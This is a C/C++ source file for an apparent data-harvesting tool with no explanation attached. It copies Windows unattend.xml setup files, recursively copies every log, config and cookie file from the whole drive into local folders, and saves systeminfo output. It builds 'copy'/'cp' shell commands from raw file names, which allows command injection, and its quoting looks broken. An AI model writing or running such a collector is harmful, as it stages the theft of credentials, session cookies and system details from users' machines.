#ifndef __linux__
	#include <direct.h>
	#include <windows.h>
#endif
#include <dirent.h>
#include <stdio.h>
#include <cstdlib>
#include <string.h>

// Function declarations
char * giveCodecPage(char * buf);
char * concat(const char * first, const char * second, const char);
bool include(const char * source, const char * str);
void recursionScan(const char * name_dir, const char * str);
char * substr(const char *, int, int);

int main(){
	// Operation system
	FILE * file = fopen("settings\\info.txt", "w");
	#ifndef __linux__
		fputs("Operation system: Windows OS\n", file);
	#else
		fputs("Operation system: Linux OS\n", file);
	#endif

	// Codec page
	#ifndef __linux__
		system("chcp > settings\\temp.txt");
		FILE * temp = fopen("settings\\temp.txt", "r");
		char buf[1024];
		fgets(buf, 1024, temp);
		char * t = giveCodecPage(buf);
		fprintf(file, "Codec page: %s\n", t);
		fclose(temp);

		// unattend.xml
		DIR * dir;
		struct dirent *ent;
		if ((dir = opendir("C:\\Windows\\Panther")) != NULL){
			while ((ent = readdir(dir)) != NULL){
				if (!strcmp(ent->d_name, "unattend.xml")){
					fputs("\nunattend.xml exist", file);
					system("copy C:\\Windows\\Panther\\unattend.xml .");
				}
			}
			closedir(dir);
		}
	#endif

	// search .log files
	#ifndef __linux__
		mkdir("data_files");
		mkdir("data_files\\.log");
		chdir("data_files\\.log");
		recursionScan("C:\\", ".log");
		chdir("..");

	// search .cfg files
		mkdir(".cfg");
		chdir(".cfg");
		recursionScan("C:\\", ".cfg");
		chdir("..");

	// search cookies
		mkdir("cookies");
		chdir("cookies");
		recursionScan("C:\\", "cookies");
		chdir("..");
		chdir("..");

	// Basic command "systeminfo"
		system("chcp 1251");
		system("systeminfo > settings\\temp.txt");
		Sleep(10000);
		temp = fopen("settings\\temp.txt", "r");
		while (fgets(buf, 1024, temp)){
			fputc('\n', file);
			fputs(buf, file);
		}
		fclose(temp);
		t = concat("chcp", t, ' ');
		system(t);
		delete [] t;
	#else
		mkdir("data_files");
		mkdir("data_files/.log");
		chdir("data_files/.log");
		recursionScan("/", ".log");
		chdir("../");

		mkdir(".cfg");
		chdir(".cfg");
		recursionScan("/", ".cfg");
		chdir("../");

		mkdir("cookies");
		chdir("cookies");
		recursionScan("/", "cookies");
	#endif
	fclose(file);
}

// Function reliasation
char * giveCodecPage(char * buf){
	while (*buf++ != ':');
	buf++;
	return buf;
}

char * concat(const char * first, const char * second,
	#ifndef __linux__
		const char separator='\\'
	#else
		const char separator='/'
	#endif
	){
	char * res = new char[strlen(first) + strlen(second) + 2];
	for (int i = 0; i < strlen(first);i++)
		res[i] = first[i];
	res[strlen(first)] = separator;
	for (int i = strlen(first) + 1, j = 0; i < strlen(first) + strlen(second) + 1; i++, j++)
		res[i] = second[j];
	res[strlen(first) + strlen(second) + 1] = '\0';
	return res;
}

bool include(const char * source, const char * str){
	bool f = false;
	char * temp;
	for (int i = 0; i < strlen(source);i++)
		if (source[i] == str[0] && !f){
			temp = substr(source, i, strlen(str) + i);
			if (!strcmp(temp, str)){
				f = true;
				delete [] temp;
				break;
			}
			delete [] temp;
		}
	return f;
}

void recursionScan(const char * name_dir, const char * str){
	DIR * dir;
	dirent * ent;
	char * v, * temp, * r;
	if ((dir = opendir(name_dir)) != NULL){
		while ((ent = readdir(dir)) != NULL){
			v = concat(name_dir, ent->d_name);
			if (strcmp(".", ent->d_name) && strcmp("..", ent->d_name)){
				recursionScan(v, str);	
				if (include(ent->d_name, str)){
					#ifndef __linux__
						r = temp = concat("copy ", name_dir, '"');
					#else 
						r = temp = concat("cp ", name_dir, '"');
					#endif
					temp = concat(temp, ent->d_name);
					delete [] r;
					r = temp;
					temp = concat(temp, " .", '"');
					delete [] r;
					system(temp);
					delete [] temp;
				}
			}
			delete [] v;
		}
		closedir(dir);
	}
}

char * substr(const char * source, int begin, int end){
	char * res = new char[end - begin + 1];
	for (int i = begin, j = 0; i < end; i++)
		res[j++] = source[i];
	res[end - begin] = '\0';
	return res;
}